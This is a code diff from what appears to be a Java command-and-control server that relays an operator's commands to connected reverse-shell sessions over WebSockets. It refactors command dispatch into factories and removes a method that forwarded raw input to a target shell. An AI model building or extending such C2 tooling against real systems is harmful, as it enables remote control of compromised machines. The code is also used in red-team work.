@@ -2,12 +2,14 @@ package com.mtattab.c2cServer.service.impl;
 
 import com.mtattab.c2cServer.model.ManagerCommunicationModel;
 import com.mtattab.c2cServer.model.MessageEventModel;
-import com.mtattab.c2cServer.model.enums.ActiveSessionsEvents;
-import com.mtattab.c2cServer.model.enums.ManagerCommands;
+import com.mtattab.c2cServer.model.enums.events.ActiveSessionsEvents;
+import com.mtattab.c2cServer.model.enums.commands.ManagerCommands;
 import com.mtattab.c2cServer.model.exceptions.CommandNotFoundException;
 import com.mtattab.c2cServer.service.Command;
+import com.mtattab.c2cServer.service.CommandFactory;
 import com.mtattab.c2cServer.service.ReverseShellManagerService;
-import com.mtattab.c2cServer.service.factory.CommandFactory;
+import com.mtattab.c2cServer.service.factory.ConnectedCommandFactory;
+import com.mtattab.c2cServer.service.factory.ManagerCommandFactory;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
 import com.mtattab.c2cServer.util.ConnectionManager;
 import com.mtattab.c2cServer.util.DataManipulationUtil;
@@ -38,7 +40,7 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
 
 
     @Autowired
-    CommandFactory commandFactory;
+    ManagerCommandFactory managerCommandFactory;
 
 
     @Override
@@ -64,23 +66,24 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
     }
 
     public void handleManagerSession(WebSocketSession session, TextMessage message) {
-//        System.out.println(ConnectionManager.connectedManagerToReverseSessions);
+        log.debug("[+] Current active sessions are {}",ConnectionManager.connectedManagerToReverseSessions);
         if (ConnectionManager.connectedManagerToReverseSessions.get(session)!=null){
-            handleConnectedManagerCommandMessage(session, message);
+            CommandFactory connectedCommandFactory = new ConnectedCommandFactory();
+            handleManagerCommandMessage(session, message, connectedCommandFactory);
 
         }
         else
-            if (!handleManagerCommandMessage(session,message)){
+            if (!handleManagerCommandMessage(session,message, managerCommandFactory)){
             SocketUtil.sendMessage(session, new TextMessage(
                     DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
-                            .msg("Command Not Found. Use '"+ManagerCommands.HELP.getCommand()+"' for list of commands")
+                            .msg("Command Not Found. Use '"+ManagerCommands.HELP_MANAGER.getCommand()+"' for list of commands")
                             .build()
                     )));
         }
 
     }
 
-    public boolean handleManagerCommandMessage(WebSocketSession session, TextMessage message) {
+    public boolean handleManagerCommandMessage(WebSocketSession session, TextMessage message, CommandFactory commandFactory) {
         String mangerMessage = message.getPayload();
         log.debug("Manager input is: {}",mangerMessage);
         List<String> userInputAsList= DataManipulationUtil.stringToList(mangerMessage, " ");
@@ -97,22 +100,6 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
 
     }
 
-    public void handleConnectedManagerCommandMessage(WebSocketSession session, TextMessage message) {
-        String mangerMessage = message.getPayload();
 
-        System.out.println("reverse shell connected");
-        WebSocketSession targetReverseShellSocket= ConnectionManager.connectedManagerToReverseSessions.get(session);
-
-        SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
-                DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
-                        .msg(mangerMessage)
-                        .masterSessionId(session.getId())
-                        .build()
-                )));
-        log.debug("Manager input is: {}",mangerMessage);
-        List<String> userInputAsList= DataManipulationUtil.stringToList(mangerMessage, " ");
-
-
-    }
 
 }
